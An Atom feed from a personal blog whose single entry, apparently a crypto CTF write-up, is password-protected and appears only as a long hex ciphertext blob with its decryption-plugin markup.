<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HvAng&#39;s Nests</title>
  
  <subtitle>Nice to meet you!</subtitle>
  <link href="https://hvang10.github.io/atom.xml" rel="self"/>
  
  <link href="https://hvang10.github.io/"/>
  <updated>2025-08-29T17:50:04.389Z</updated>
  <id>https://hvang10.github.io/</id>
  
  <author>
    <name>HvAng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNSS-Summer2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/26/CNSS-Summer2025-Crypto-WriteUp/</id>
    <published>2025-08-25T17:56:23.000Z</published>
    <updated>2025-08-29T17:50:04.389Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f5e42003afa4cff4973ae40043eb31562eb66a062f144e4dcd5e4f3b46a720c4">1fdf028ba9067cdb279b99764cc0607e0af687b03a3226a154eb0053b482cc2bfcf9020d4c4f9f9d595acccce1b66a702d04af0a35c01fe9c6471f72809aed35e24588ad1c8c7cbba734f5a77d08d02be4ca26ecc134ce6db5cf201d1cee3b6654f00652b1740bb24131a04763227ed58f4800ad6f3959d42ecadb2defd47b98b6deaf01d2ce815effe881bc7afdc458443bdf77ec0a228551d6d9c979672023aa10c1094577fccecbc2f4171baf2ad1356aa7adfab9ad1c0abc12a69b66f94f98a47bc8847969083360e969f97a81ce037c6153ed0070563dff086d9d16ead93218238afd84b254071804344852ce197260dbfaefe0942b10ea30edbce6f1f168ad9341c838713021f30a99b0a510cf88e6d18ee6633755c6c4f1c68007e5833d73588619b1c740697f07df1def188389c2a73507faa8301f3c2bebef6870797335aa1b301f2d33a6dd29c9ea14b420db5c76573bd5148f7a834f70ba2aabcc62a43c9f43ff4e7b842ac5c890d8384aeeea764b74ea05cdc8021f4e81a754f19a63bf627512a7fd1257dd20f2157099aafce6675ae3480167af9fe0acc1ef9af948ce537b42435fd4b7462400b50db1960defcdff159ba7a795f07389c38ade69ab6489e9f54c5a29071b41a8b8a3a7bc952df1839601be546aa7efbb1ceeda2d24007f750868e0682c14079689a8e16e45e83946c95b2d832ee0e811ab26a4aead0b2a902777eba26e783d9558a803a93e96db7f3898160efe21fffea6a8131bd970c116fe65daf63796aae50be194350f35e2711b563987f19a932949da32819ab3488c75185c5f6b28cc9c98de226fa79447b4ef96b008d7572b4e191617b4c2b3c79f79d7395d5601d2832fc6aea28db9f9c03bbbf801c28acd203a3addfc15487e2ec880ee782682efbfacb04326d7a3e453825131107df071321668c047cf782647e456b2a7caa25fd083829590385a4c183cf2c520091da3ec57690049f54ebf5e7fb7dadb026ff3f22fa3d8a1251f75844471061e68872626f2a72ece465a84b7d121915493e7da1573b9f2c3eeb3871cd73036239a1f71129955bd64831d50afb004e4aaabd97f0edb0c025456eacf05b84d7f1dd91807af6abc303d944468785df1e5680b473c00dd7f9c937e5998530c8a55547d80639ddf39342c35bfe1a27ca6f352475ba031d6863bd38ddb336ff8f2624807c6672015f904bace5d24bc39eeeae42cb2393a76cdcdba5fac86f23a4066ea95fc12be20345ab9d463763e273b83a2174eb99fc6732e801541714451ddfc0dffd950e9c51090f7df9f92379c5df90473421229b2e2cfd5d4f14c55e730632bc2b43e5d06240eae54e634cfc1b39336ad3ba090889885f055286e77b87b17e74d16bfd4a796c16710cf0d4af23b6430dae1e3a802e68506e9f24696ccf1cec46de3d3071dd8cc37fc49f12ee03bdebc1dca751e1b48a713aa932399b3e28cdc19995a4141821161d6a2f9eab8419bcd4bd2c7591de35440665ea725547835b577891a82f3a1a02b6c135bd6744b526f51f5b1661f701625c3e67bba0ce201f283ba3887e9c3fb71c564b4643a731013f70dfe3818c8e67dea9753b1efe32b317e88211dde651b7a9e5cc0dfca839387eb37319ba78539c2381c9e650ce6c697513d5215c76e5d9cdf5512722a8a43a0c71428d2f1d655179438968b2927615ede0758f46bf6c0f24a709cdd1c23f0c8a9ee7d75e9c781d21bd9ef7b6b53aaf68c0b19d4dcec8d4779e774dd50ab344f7860075e9032c569d86f73d3eee1e711ce33d3b622ec8b434b73cfa01f6930914847fc44201f481f3e1052922702414538f75d76e3dd7755b870ac0518a379fd6c79e025ef6f833e971af0b9ad1a1c78b6f17fc6ffb7cfa37edac0cc062c2542f8216b53fe6bae1c3e662544ac253142bebfe7a3a6ed5ded5a2acfd09e334906e740ed389eace633ba5fc2fc7ba1a1a232caf33d1454c458ce00849a6a86c74ddd87f12884b741c9f7f41973dde6af0f6ff5d90bb9f780c0314147bc7888727822ef70be0264bcbc217baaa86a1c5b99abc8e51e0c686c2ac975c4cc3fb6204a61f5b83a062db43c9d827ec58b83f00593bbc2fe20c123cf985bdfa346f4e6ad683045237a791bcef13ad3114ff790f7537328a9cbc4f88022058688f72965daea0d548f1bf265e4dec65341024e73cb8b6dff84ea926d1afbb661069126a2812bd603ca527edf4eaa4235b3fe621c24d88a6204645e2e4138dcda195f38f4a5aac2b680c4e176a9b2818b1f6bc916d723d3cc97a18ee2018e5b0a2a6e8dbb52fe4a21709e7f171ee9491af85942ae9418be12b80164a5998ab80f79a8a3908ce74777c07fdb8f74ca620f993b9e74d6b1d5d154527a16e19872723c6e2e50fc33c7421213c991c99d861acbec7b3180cc2e09155543c141752c486db2048073c6271e4d8ea4f4e91b0855cfd0262ebaac4027405acd69745897e38005c4d90d86c9001df627a51f0e9c51675b2c35a0fdb830bbd5bf3daf5f0ffad3e31923c2d82c23db3cfa6741bb0a880ab3eaea022d5535893ace3b80de5b1be936a808f3ccfdf92297ca0fc94fc5d449baa63b5e3ef59829fd133109bea3b130e4c70d99801e8989454643f09c0f9531ac17c031f7022a8857d84413b53a37e3bbd23f7ba6df0378c8ac0edcfe330efcaee6f345a3afd2022ead4246208d4ca9cac74372bcc8dc6b97acce703e464553acc692de03ad818ede1559698475132f0b2b5f5fd7e034b6244929627155bce8a80d63ba00c26493f1457312b28a92d45a40419938c0e0212f17d4fcc11a2b7f1cbff2806099d6ed3257d93866e567d8900651a924be497c994d32a4d44f4c6f2a86af4b232942df3a7b86893f2638045b47137248deab45636fb9d40d467022351dff608bcb5a12858b6157e44ea2415ef536b25b7c82790b16ebdf3d4001cafe910764488ed5b240836974ee095addee32f0c39019cf5f30231671441144124763421da54b8cbd35d0c85c16113ab23bb951605d3363fdf526bcf942cfa3359cb69f61714fe956def48a611aedf3eb3a4e051e76f7d078bab134f7ba94da25daa69bd5b9e6db78cbcd603252f644bcdcc96453d166eb0e422dcdd9e13e7bd8091abfdea2466c296a549d92c8ca685843f52a1445f9b021ad86ad0aef13cd32a45da9be2b8dbf0a9a0c0af7b32b06fd9e77a38f820c0aec3386316b2d79329ba7d93daaf7a3ff036d1a0e43f1ef0358446d2a3f7301ff5690356f15b84b0d20a984783f8a36fbf2120484e65a5ef264959c9ccec8f7c697f66371700c14df1c2d1d880e1f7372e3d569f7aeea3255073ec00eab8132cfa26132e56088fd7f7113e615014490151e68c756d20e2f948489ed6f254e15b0e8260dc1a84b9042a175a0af4f96727898444c63b0422e18d9fa7587c8909b8d8c58983fa9361c153a465426badaf8eac640444daeb404cf4569a2bcbad6445d857929d238dc06f0326a09bba25d235e4c5d7076d1b2db1ee162b042cebf106843f92204be0ead81c55fd0c0d4a58b65d939268f26a9974a49fde989eec85667c2b4e67ace6b70962e4d98a41ee01efc9a89748bf9708d6052104e3a1c61bdc04b528468ab6e6b1ba7a70ebd04b3498732c31361cbe597de548ba6853322a0e18efca5771296e905bd0f14d9807bf6520fc99adc03eec338355ed2a78cd747e673fca0e86f35461d99472b93c85d337e3ff57f96f80fe35ef841f0b7d268831e92b099fc8f7481e4ccce5d93780b9d30cd4681b116918c46e8285ba984b2efc11f9438c3aa35958636263cdc10158a10a73f04849f7bbbba751823b09226077363ce5ae19c8848609fdbafb0b51030b8f95699752463c1bd09f8a827321b07ee91c006fe6dd358090dc6046092d96667a3462a2edddf4eb3e63899a3c36de5c3230fc2e3468784f2d90c2cf0938b7f8f164cfc06e077a0260de321c13c21abb73cbf10ee8553315380ffb3171fb084fa1d8ae4f0aacc6add0cc117318346e934c4b883b7544f93fc5cc0b1c08410e7775e497a8d8786462c462de988a6588f3aa7a45274dcce06d286bd176626abc244517e7388ac47b2b43f4e72b6b214b96b9a478806b07cbf344e1d66d285591db4632b0108d3bc28ac40a400465faf7acd4bb03cb3af74d25fe2d86fdaf12666e2a918c5ddd7cb48753ca2c2b65226593ba646a6476f054829465fd511b1b26066e14006977f1b8b5ea46807cb153a628f818a5cbea1329e5231ec212843f46c54addea9126f2c64ad38a89d65ad69a3dff5a5b0242988ad253b98ef266a09ec0d2e48f2fc5f092fff6e9333c1ae410a4415f6372687a09925c9c269d93ee80db0da6cbfa8e5422d00ab175706382ad858fc7cda6fa931f02c3252c02cf99c1231cb89f6caf92c187830abfc604c4fd2c25fecfda0091d4778112df3b7df731916f198adbd94e7364e539338ed3c7d95b690344530650981eb8b7d366dfd0295933949a24ca73a1eddff91aeb51c6d43cadccfd1ec54db68eb85000893247b1e250b62becc867c24ede043034054ce3026d6011989dbc45665f3f9d96dcd6e6e2d227804634fdeedc03ea6f3f9b0310f0c425672b3cc64db89934606673942aabe51204e914ca08921e3897cd7ea8b6367e6b4b05e5986090d9b3cce69f0a46c6d21be48fabe69ae4a1735c594b56e7601e1acb2af49fb70cf94d58f6f048acabcbcea3f16090b3806c9a464cdc0d938ebccc22220748010b17755bc24fc658c0c75ec9c0d2146910e41a36925959e8e0e6508b7248e1b5b24f42990b3051a297772c81bf6ba1525f9bb3b335b8f9cacf4c7231bd400655859d27c7da781c92ce4d2353a28ed31ae8292bd2f878e7462e245825d9729b0f341eb57e1fce36219d363db3c37f95e18ff161a0a9088a11ce15dad0ff4fc889156176afc87f8ff743d001b2ea9a0f6794e0ebed3e6a35c920c54cfa04f09770e698149eb19f5742bfa7c24d7e2ce35a2b3fa72a88286480533537da16dc956e34d054792c4a26b1457a5b5f60b50cc2b9ddc74c1ab22c42bb81e4b11882919e3c281ccadab563743f6e15282787e97111b85a1aa7d95ccce4023a185a472aa09bde2cefef29ac354d3b6b0dd6e24374ddb87341cb265638ba03d46d70f6f224618bab1fd9fde622d4e2e9b5fe2ab5cac43990c605b3303a711a86194e92b9df88624dcf00228b391fc803c7947115f157948cf7aa7594b22bc23d60627cdcc3e4c3f974303dfe3c628818c2e63f0aabd49fe8b318e595720e553bdb998d6f8e28cbfba3e15b9af430ba8d30e5221ecc0d8be56e067f110c681dd65e499fc6cc67bef855239361d9f0a07016d3df00c1816d8e74f51df83b8070483fe0cbfe02005aa8ecca49a208886642544eb12a3e0b7caaa6df16b9bd31c3efc14bf37fd7384ab6425f1cb4fcfe92d5effb3f6ea25fc8cf19452f1f4a6db923917fcb932d7141f091cc1ae6172b2d4b8abbedf55122ce683b9fb3d9cb16da1706ef67c1cd00a06d8e8b93d133236634d22b3a719dd311d7503886dece9eda3100215f9430079586d18d858e189435eb7c97f93d8d106707b84d0b67cc03849da0c2810b5e16ee00d8b5c99a8ced346a39ec710e4d3443f3400ca23d8567b394bc270bdd9d7eabea65583583998333949ea2c9b6d6d9402f6b131d02af7e533eb9dc102a4a01a6ffef20cd7f0249abc85dacdfd24a8a2b526766a8360d07fc18162488da30a53f5ae5be06908cd6e7c0d35c26c5f5a9ac59bb1584a7f2ff751aa31adf706b0d62a2495dbd4afbf6be7bd50682027410954c7dece9fb08329b24977af6606c0b2bd8aed92b8679bc5374e489432ff1612a24714bac1da34471af0b0a282860f19016906b7fb63d65c261380f75afcc28ad314108775357c684282892342eb1796b0727bd1370eb23c0038dde6c913bf8d9c716c89b22cb19e9d7bacaf2a3789369c7ef846ebfd64a4eda97a743f532aaef5b9f31a0549b453061c0f3d3cdc667761388b21cdcbce19112ccf5ce77bcebcc1448d6b41b1c22b164865c67df56bbfaacedc2e4ca98777d77b2628f8f03e5b471d8ea8709505adad226735dd4c50be0e31d42d0a0777461b31e19a4716987a79420ddf7fd1c6353bf0feeaf212ec636934f735c0143c9271ce7f70a83e0cf7f1e0a24e393d96ca53c594ffe673c2ee65b0e9efd80e361a1a187bae9a3d50035dd1ed6546a9bbb927fbe1fdbe5503fea5b695dab03080e201d231ca36262d85d40fee4c43d6151afbeb89213307207cbb95aeba0a900e7a8681bde2ddaa14f7429e75addfbf2f51c254ed4dd95f4d9f085e52e0ab136b3f218c20fb960c0c08cf26c988e9defd6ea4511edbe0ab0ec8b683733f7f48160e7e8b686370f29a19d2fe4cde1bde6c652ce82be119246507e4bdda1f38389638ccd896ce38546f824aad63cc90bad580f18cf130c76404e09f3ef4b005fe76d40306d0f98a42e429e72e9f4a75fabc4af9eb12ebc69fa0be79d27e57e6cce8d2ceabb75500c790e5b247a3071fa5dcd7432373c77dfd4e562eacfd7bb60167246024f9150c382dc77e8b4c8a094dcd718e073a372a8922d96a79e6cc8f38e248accc4ff362c8be666621f11dae48565926f82a487b86e0e7309fb25bbbc554f4c8302936e53d9f59969c3d7d579dd8cd08f5620d61aeada2b0897f13b7e6269b8e1be9a29a811d79d708c08a1bd00ac3aabd0dd7ec4123297c216417ec2b656df40caf0fc37088b23746800c40ba016d650dbd1e70afcc19d6211d5122493dc37455f0b82fee71abdb2c137072b10badf2212a85db2993b3ee8784e1cf9cdc7af7ce93f38fb4c2a8ff00f126b339e646dbea15616715cfbb50b5d90126c80851aee38064d50374cf5d01e6b2aa8a4402b0b6ea92b8ad87f7dc188736c2c0752b6bd811a08b3089fd7f7e0cc0c1599fc1a1c8433ed17e8ed7c9efd7662f8d0139957efb84d2b79c6b8136d8af4b5fc175b8e0a2fdc7c1109d5149ed9a5d0be827ad06486aef207f74978e6829e56d3414b7fbc43d6d23287904ebdca1903c3c1b59c6c486bc67e017b164534a97d40fea478d17bfb92c6a8c8e234997abdd3dca3c5cee2ea99ca5250abb2b1cac59cf65c0213780d9475343e755d4cd9354ed3ce73251ec39a050e60584c16325ddbd648a28ef3738426c7db8fbb9572ce0795ece05bf96030d7ea8e2bcad135aa2edbf6dbe7f6c5d37f751d71a7eaad07e810796646336d5792bf6b463bc40384df589f60923be133395ae591a1ce97647cbcc05b7e7e9d197f334bf194d224e7c63f8387e904760bfa917408f6730c69ce9123361139ea5f440896cb8dcb2fa95033ec1de39d1b673f88516d65d12fcd7ecfa79bceee8dd7ed6b33633e042ec40386ec6c2448b32b5cf37b0092a67b00eca71267fc9223882b90da0f8a31616f056e93ae08178682ab4a504b3f03d9886f2962c0dd5ed751fb9d5a0dd4aef4d6a973ae3e1fb35d216fddf762a19ceb31ac6d751e2cc9ff3f513ebd14abd8f4bdcaa39d1ac8bce878fe52c332787464fd68d577512aa2060d27bd8da40f430fd557cfcf0665241b5a3dac44dbae7e8aba4b93e5ba40efb0434e91ffc8d90aa3213ee0fa60586ce74a6f185a1d348e11fc1042a079dbd3a28979731c46b8f73abf9d0aa325d6e0f564772f379e7bb6c1ef3555f395432f003211ee4b7c32f0bd633ff0c9fe02a69f4cd0e9a70b2f2a03f7f8423494cc0749cab7cac8a4dfe884746ad9822dc2e0df8d5ed962b96e8563741253c6a532c211cb9fad4d72af016c5b13fceb631e4c83712e9cea2dacd7c3b51e4cbcf09281f5004965d21c7c10043479d741645a0039b728bd64d893a045261130ed255740ab816c1406218c73e93f538b4ff5f7c373c8e3655c50f2eca7709f1b3a1ff7c676bf5b436d6109b26f13308b0f3f882d3ae15825471e32c730e4579b7a383522b729aaa7d6cce1f9b2bda893cad4545d13f63211dccff88cbe46ad84d07fea72e0805a6dfa66a23f0e8a6be26028c75d1b93e52245913d295da22c5197af6ba05d2c61bbdaa94acc3509b68228b862a58f869568df564423ee6e57513e8194563304b9670bf84ce959085fc0ae251cbedaac4ceec41d14bcf43faa899368dbd7da7b00fc162dc6a86d4bdd385689bc505badcd309e1f0f93f446726c93063eca64a021b8fdcae8e133e2fdbdebdd3f5cd0bbafab7c46ecedcdf6b575ae3996635d60bd6dd3d0aae0b97292a13808467fe23194bf4c33d991f759bfc140a7cd231768cfe554f4a91acbd74a9d503a73edb15ec5a5ca18adaafb8f4f826483631b4c0a06fae187b555a4a59aeadb34b3cfade66fa8408eeabfc5558658fe26d1b9a92bf609753ae930f53c44d548a3a06d3d418072942ffe7c2bbfe3b2c84991814c5dd07daeb63404750a02eabd56a8d7cbf3bd4441c77021689f6c4323e1460e00a704e18dc7979d64cd0158a60d35f96e9b8603997544d0d62fa3b5712b75953a9aee61b79030dc746b19c9c4a0c00af163230f5cf73165e974237892c6dbbc80e1141bc577ed2e6be943725a3267bfbb0aebb031c5d72219bca90ddca52dc12a957480a3fb15db1a76218eb4cdd3448c7d8033e5ac880164798f02e6ec3ed8b90c58be1e66b49a26d187874d4a62c964301fe79c0ed31f244bfdcfeb432899f17261e3c49e3a54e2c3b31b7513b988001861a3fd28a4181fd74c34ca1058b2755f90abf059a4875bb171cf116953f65826036925490dc36b7b540bda7423a2608453cdb1b771b7b815a45fca5a87578845bba6964882fc65ac6c2affb89995151252903d1508014eb29e8cd1a2ed5b1a2652fd4d2edca486d5141bdc71447e7b4dfef0c19089247901b00325a84b0087912aceb2edfa5f6bfa477625587f7a1eb12a24e330ebfda935fd821db8e588250980603ae0639c32e7a8419564b07507eb34f71abceb422378cd40120c0047bb69fa764f246455bc1e079a5574c43ecbfaa018d67487641d94785834113f616f6e2c40fe1137a7c063a04c73a9a5808f8b1df2e85d9792fd4e24cfab56127e10b403735930dfe78bd5b623c883a16414cd29c77adbb50bd018bc3bf38fcec806d533a0f3336c58ca2955557c7b7f97457fc3d41c93545bd46aeedd4810331eaea64b22bfe9c07cfd0f6f9b227be67b07c43a278d9baec0f88d71cab1c882cdbd4c1effb3332d36bfa4a94927bbe3d263ad840b1ae7a2819fc0346f5ffa7d2cc880110d565b1a7e50170058a212781d6cf42e49399b8072995e6497155608656a2986c968c622a3ff13b7efde4c4948709d2974d0f41c823ad2caf789b18924784715fc26b1165871133e6cdb7f020364f0eb9a7435523900bb66dab240a7aa13cbee8e10dca27c5436e0ac7d3a9f6484031081cf976a2e034c03852f6b80111e7056a4ee460cf56257f14de576bad4adfb2ed1b60a56a97244e6ae5b0f97d57380759716e944da3d05a7fd6d63b7d266b03fbc280aa1f178e4182236cb9802460f82d200e279efc126e039fe66692fa4606f7bcb4389a7ae72da7098409814d048d515634b3cad8aed561727de22f17b137514a43eee5d8dd5fe74ec40fc60ae0345769953bbe3e4ece81511d1d36b2a524abf47ec2a2c3e3447fee23ef6f55c90855329fa057403c9b59c429755f57527f7f646120ed701bde8f4ae1ad4eebbe5d0eaf7c7d4de3e0559d290910fe50823f365411e291e04768c5756f1763dd0edbecf90d0e49e538480fa1c3c5e3534dbc31e73158dfa29404cc37a2f0400c5d55d26c9b488ce872e7aa0bbdba326426faa593226d3e65a9bdc4a0d8a5e6a2515ac7780c3037d5ac3623b46fb79cb57935f2df136f5f571e5f6a73479ecc5a7868290cca17936698b7a25c488889f5206ba20bc50ae548e5bcf29720b7514820cba9cee0815d842ff1c0832fde9d061ba9b944c0177689159b538811be6abf715969c11c09218bf916f629403867359270948dab632618cda4caca77ba77f0ed69531097d4d2c1bffe843b6cd1a70eea81aeb28c5895d6ca2e26c96875a3c04a219bf9ec358d3925d0b1fb466d29b23796bc36b4142fa91dcb0b6da5a00a97d056f0e13b640021b9c888e42009b8d7e51a00a3ae218c1ca56b846a365e32f42c1ec5c5e5c80afdab46c3c7e7edaf2090b47286363898f5a9c58698ab9fcb3256e0444378c32abd7c9be453f7b91c21f7dc0231ef1facb25fe07bb3e9a79ffe6a4b70a5af071e78fd48fde35b3eb2257420fe4f123799a24165f8717004626533e8b46e689cdaa258c4d91d9b0a5d9f1232886758fad17e7495fdca76cd60c498ec37cc4207f97004072be7cce451763379ac3fd943211aa959ccac2b9a32ce63b46b9493a3c297aafda316eb75a96339d9fe07c2e3ed49fce9c600fc9f4e09b48aadc79ea1bc1376b7c8a89a6a47e434ee988a3b65b8d4cd2e7992d9c7691a7785f07a5661c2bc6042491012b53214c9be9acab75ea7fb93ff35e536a4d05d9647a1caf91e0a561576ce53f05274f8dbfe3f9b180fa5650402d4b096d7bf9d81e459a5532f3e2f5ff3b12b71a773e7300e7a7c655398a6d1c405610baa431f4938db4021e6486573ffd24b70397552759041263292b7021e06f7474a138819a324693770cedd1bb5ad0ab38cd75e151e0430bc157f065725c9cd5489498ca7df07cc2dce1747ee9bc8c3f96125c1e766b91dc91e875addec42eb2190b3b1a3f4c76541d6f04579d79d44ce1013e8ceb81ab86a597ab84e7e57d90509b610fef6e24b46947dba24de1304ce65e32e198b5e24981b37d73df631f962c2eba9fa3ee5da19dd7b3d4c6209d62c8f048d8603e492e04c08e31c6c64c3d3c1e0a43405ce40b1e2f4b20bebf687c55146185e3724002adc0d59bd6e2ceb3212075d6eab02535f9fa4cfdcaa5e71e61889cde785f209dbaee3558f2a8ec8889557a8320b57a5c0f4dc114d3703678d70f8f66f8e3eb9a08fe5c5fed9ae92000214638fff46cfa05db7f38cdd4085f613b6d6dfb4573193a6e701bd14265c7a3bec4bb5f99873ba473ed04d7c6236c730c18476af9d96f399f8a68db445401ccfdcb4c4ba659dc54684557e16c67967fba0204522c4144b542f0da45e6bcca480c88b70eb127d1205c52c5ec2b01ad55dde2666f311f46e058ae9dfd3ec2431a9faaecaba9e6b01dca6709ba880290c19c09f687b1bb0a5f3f7be303ef5b7e84759320c313f5f81438d1941abc909b4e056ea95e39ecf3bf7e4b2b3da3363d204d84c301fde4569ebe4427a1c76705f246eb0aad6094538afd72c50db2a205df2bcb584a5f8e8c6c40879372ba608ce01eed6cfae055e650fc821800a128125de5e87c98dd178aec0ad53bc1caadf886af82cb693b23e236e9aec1d062e1b17e52ceade2e738fc42558ed4b25ddf630f2e7c8b069de24f8068898600b530ee2a4646bdde7143cef50793792c7120e561c168df8cc5130e4716531ce425c31500197d3ada9d7b8d221c079a17d99887432ca708a2a06f5468ff058b0278f13a6cb17f221e447aac1b895ebaa0d70f55ce772deb70f10149c4811a308002e2b0374381af26bd6ffaa5dd6ee211e4b12f17aa28f4d7f0d0b407161102bdc21ecd6f846387fc7617d3e9e8dc4b6ca9c1c69ef721584a12089fc3d13856a87e6ed900db6a700c9b57655163cea4a8c848a5b0c00a82afbc83b49631f1e62e0b228d7ab1b3a71eb9431c3cf06271a71fd7a41a5221c2b1463ed164f1ba239110c5aa49a6d40118d650552810101ba80d967821f9cf84bc30f6fd3b815bcc27cd6e8ce480053247baef0b83112a86a8749fe41640aa3706930296580f1b76b2cee0a1cf4a652e81667e21fe70e9f87c4a7832c59d5fe9a6229aea4ebb702693cca45c5c3d9d2b4d70a57c038551c845e53b10158f5bf9e452a9e90a327e5648a0e534964ba48dedf2707724c565468082dce586e048b6f26496f0850f8f781c57c55d9451aacf2f52ffa3f779a12cfbc3b9f0b8f3d5f64b2576338cdd26811cb8b259cfe8250867457af14e6e525949cf63805b2e6dc4ad3a1e7631e382f376217f1494a598b9b37c4b5d915ff5c47dac854eba5eb73d447b092d32353020ee12515da35dbd44f7f0979272bc9b16df4b219beda1ddeaaa32f9ed493a5fc6ac0b1ffa64b942dc0ef45a95a1a49eba3cbdac37140b4327e04210df3602f2aac5fd24b38a247c7bf8c9a9864e6e46e7143966353594a0ae805bfc10eaee5e36550e58988d92e805a711fe3731c8d3323043cf5b7dc390073d6f7e3336f9d8b6fa5a544612f3c28e2738b1d0eff37deb026759d7225d9281a5e9388eb3992efa11e70d1b0a61fe01bf4a7189972c3b7d246b0f29db8aaf9245449f25ab9a0a7bc43f50911b62338f120b7f39167b8d145b5512c0f5bc08a80a6ccda21e7df0b71b67975d65293528e0186baaefbf4d453d14d10d16322b824ccd63276880fb02513c14c58ad204d40721420f2b60a3b1eac1ade8b95eabe9747731f1cc7d1f376ca35b832702010930dbce50a66ac54474f7c2bd290e30325372f32d10887d52b1decf477970fa0b5d9c6f1f7c4a6282f604ac1be412ff211f8dd62a15f298a61fc12d1613c1298245a43203cdf6541d077b5625211178a994f67e8bf1ca932581ba484103ec6fe9597690b1bef2b1ab2861c3788c4425526885eb9067c340f12705a47381492cf7b3ffda8895261dabdc7bf16385071783b8721ff537e5304e79f60df2134842b2c0301a49ca4ec0a959092c7915e0b3257677638c6ae24f4cea512bd71cae1bafcfcb6e0c3f2161f196f7a5aa443fdd53d4b21e7793998fd22601d4719cdb3154ae67b19838e3d52ec1213b71b3033001be59f1ad84102571d2c9125251cb8fed63d88226e7871c16842d99a62ef9b4afa90e6d1277a0a283cf24f91e3ca30528d9b8d05f69e69155bf5b28dd48d4d554b95a3cf8098025d5e9ed90b416c03ae6a38dd4d17827d4c14494e72c8d44d1535f501fc4f9cb30a45a1ac679ca5e48a73327be4c750a968d039e088da5da5a658b2af3efef6be23d5ef9fe673e410d1e4fd368d52656b99ec51a6ecc76a5db21c9b426cdc642f6b2e6813c07c0a6692654636700e508b10eff9294be450b7d61090d833e69e5bffa5bf8bb2d74fcff8d6ded5753e42a5cfe4454b55f0bea895cb102d7892f470f1a8e6cf3743eebc5f5ac8c354c9fab19996a44eb9d92a3d3ca545c4d28f8113f05ed98cf034e8c2c8a16ead461339ae90c46d8326183ad389b3ee248bebfb5ecd7fa098e30276a521787f10461e7fe77eeb2f927711b0fe9eb9d056e9d7eb39e734f3db0323458c669d1dac73a96780f26b3cbcd1bd96d2f510cbe3591fd4ba028aca2fdd6303cb0c7a5b3863fa50beea0efef3a47d0659ed5b029fb2c2ca24abe7f1e983d3dc57b2914859c78c8c58036aa5f11241ef9b6a600f12fc1234e4ded3dc1322d1f9e990e48eb0ea68b23a12cf965bbeb1a0e101de9a87ddf65636f1ef4f5d1ee6c55176bae29286f315f706ce856d10714874b4dc5a822a132680db216613e15827560f602b3e35e1e3fc3eb6ac9d74a5bb86fcaae1a287923681487a60b454c750ea3b314c15bd933b71ecdc9ef9f66c01f68ebf8209705f79003de1228be0e49b54347ed013e92cbb5b50a29fd1016c3992f56cf985d102d143432923facd94d3f6f60d2cdd72d2155f9585af66800f9a1d1f103bc5a63867766e8448364d2ed7e26342d468a95ea05c23575412246eed40b3718eba913f521ee0c68d7b98d21cec5f1b39407aa13158f685e16f766ba0652fcf7fafdb70fad677533b4a06b89b9f21e08b009b01cf0ec22757afebbacce814279bde0d9e07ae13ebdd7154895c9ca94b856541d10854b49343c08adfec7fcde348e69617a0099d186939a9b327688c7102abc522fb575857595a58114ca5bd396e6eb7ed8e86aa7210e4866f4e79dde591f323865347260673d901127d72999e0452b9d92336aa73a1f5f6d17cb04895e62eeb294e1298be914c121700e93d305c3172e10fbaa10ad8304e10a56ce34df2b40922b59bceb472df792adb0bee5aad77538e7d2363e090c5969b3ed92fcb4b82f4485d49a332e14a4e245954e2a1acfd716add60ea379ab3070d7b3f133a3994ce7cff9098763bb556595bd1be49429a5d5714e8c935a22f55b6f9e96784eae9054d888c5a89e5bf5e8304ddc8628d8c6a5bc1258fc3726eeb7b04f4c1baf3e631c0b1ef02661e212234d697cae69577b46eddeec53bebc8d20bdb6cb49e615c05de449436efdb8852676c36a6b80166dded44e7b55e54d243ffedd52db9204d1c6f6336c2b9dd2ca0ea2dc85116eabca84937b440ecb092680d68b4d531315ab82da76eecd9bd9745616342c8b304722968553b3bf0df070604a242da7db240f57143f85ebc94a39f0316632cb73cb563ff9de19af1947aeaff555034e2a51139dd28cf5f9bba8e4938782300580a1b4801f14dec747aa780ca49951889d620086eaa3dd082e52d44a414804d13d5d0a708df8de7bbc3c029fbbda9d59c86fe8abd8c407a014151fee797192e31b4a951f153e6d040110bcaec3af0353c2decd5fed63be0bde0ebfe41fb787a15df0a1f49fe123c6c18af1c1900b29a46de4d7c67aabb3e9399fc23c89683dbfb5ce22bf83f12bbc2bbf6d7886527a82f45ea1086f03770ce4732fdf0c4d80a764b7f00eaded5981e7e00f0a5dc82cf9da47af56ebd7ceb9e70bfcae7175bdf5bce53813b970be45927c92dfef67cc730277d076ed4a9db255c845d7c9ae46a713f9424b6990af6d7d124f05037e03436dc4a554c045855c480e16855673440c954979750595b9acd6255d3d17c14cce2329a02f3abfa4fb4c706016368d3c198c551b3f30e83c151e8081ad687b2ac434f8f654cbfe8d6bb1a544b1cca230ea3872e1a426848a61c6e0558994262935e32ca38a1d55081da3a2fa3422c36ffdecc331acebfecb9fc74c1d6b6588e774036072121dabff641b8e4008b0feeb8b42f0e6278d797e1621dadee3c10607e688377952374cdecaac8c39d858fd467981fed425d2cb0177ea385611aa107d4122233e5945c5d1c52dc764d135667800f84d8ba8dfd83e289f1003dea61f0a3046682de151b3e0b3a3e53a72134dab11d191b346ccec139a090b7a7aa8b4380e18336e7e343738d8aefa55f5f31215af85c2695a74176e90a7067ad7e37a2edf5b13a03a756fb0978c451c6d7f32be0dfdebd65f2f9bb9ac114b4fa70dc1b3c7a7d9f8d8148224fb3b04fe84b3b72c616ba75424cb70995f542524c97e34822d80e07728ffbaa80d45e6c02210e9a9dd995a43d3522793000466620492b687b80cf25018f0f1b1ab4306fb5578d2d822721faaa45e4a857703339f1cc1d02c02232ff46095cf46af7a0db6ac4d234ba8fcdebfd7d3e0f9e2aa9359d05c2ef8c23a2fdc30f25c61fc223695095c8a98c0c26304e842c1ff618778869b0c06d150a5cd13f61f14c336432a6dcf6d96c5b6ff80531c86d1315515ae68049394bfc59d207dc0f143a142096a516509d50ba5be753023d801d3a20a3cf7fa014817a1d046431e06217b8f4803fb650fda68177571f633c5d1ce68c4f9587a2a825afcdff57ad57ec048587f42bfa0